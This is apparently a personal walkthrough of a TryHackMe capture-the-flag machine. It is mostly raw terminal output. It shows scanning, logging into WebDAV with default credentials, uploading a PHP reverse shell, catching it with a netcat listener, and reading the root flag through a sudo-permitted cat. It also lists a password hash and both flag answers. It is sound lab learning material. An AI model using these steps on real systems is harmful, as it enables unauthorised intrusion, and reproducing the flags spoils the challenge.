---
boot2root machine for FIT and bsides guatemala CTF
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/cb525f3e7944eb5eec637698f48b6844.jpeg)


```
┌──(kali㉿kali)-[~/mrphisher/commited]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.137.183
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 18:17 EDT
Nmap scan report for 10.10.137.183
Host is up (0.19s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/25%OT=80%CT=1%CU=40003%PV=Y%DS=2%DC=T%G=Y%TM=6330D39
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   191.74 ms 10.18.0.1
2   192.17 ms 10.10.137.183

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.69 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.137.183

┌──(kali㉿kali)-[~/mrphisher/commited]
└─$ feroxbuster --url http://10.10.137.183 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.137.183
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      968w    11321c http://10.10.137.183/
200      GET      375l      968w    11321c http://10.10.137.183/index.html
401      GET       14l       54w      460c http://10.10.137.183/webdav


need credentials

https://xforeveryman.blogspot.com/

user: wampp
pass: xampp 

found

wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91

Now that we have access, let’s confirm if the server allows us to put files: 

┌──(kali㉿kali)-[~/mrphisher/commited]
└─$ cat Note      
# Branch DBint

This branch is being used to test the code with the mysql server. 
                                                                                                         
┌──(kali㉿kali)-[~/mrphisher/commited]
└─$ curl -u "wampp:xampp" -X PUT http://10.10.137.183/webdav/Note
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/Note has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.137.183 Port 80</address>
</body></html>



The file  is successfully uploaded to the server. 

Using cadaver

┌──(kali㉿kali)-[~/Downloads]
└─$ cadaver http://10.10.137.183/webdav
Authentication required for webdav on server `10.10.137.183':
Username: wampp
Password: 
dav:/webdav/> put shell.php5
Uploading shell.php5 to `/webdav/shell.php5':
Progress: [=============================>] 100.0% of 5489 bytes succeeded.
dav:/webdav/> quit
Connection to `10.10.137.183' closed.

revshell

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.137.183.
Ncat: Connection from 10.10.137.183:40198.
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 15:45:08 up 30 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ SHELL=/bin/bash script -q /dev/null
www-data@ubuntu:/$ 

www-data@ubuntu:/$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
merlin  wampp
www-data@ubuntu:/home$ cd merlin
cd merlin
www-data@ubuntu:/home/merlin$ ls -la
ls -la
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
www-data@ubuntu:/home/merlin$ cat user.txt
cat user.txt
449b40fe93f78a938523b7e4dcd66d2a

www-data@ubuntu:/home/merlin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5

```

![[Pasted image 20220925173236.png]]

![[Pasted image 20220925174048.png]]

user.txt
*449b40fe93f78a938523b7e4dcd66d2a*



root.txt
*101101ddc16b0cdf65ba0b8a7af7afa5*


[[Committed]]
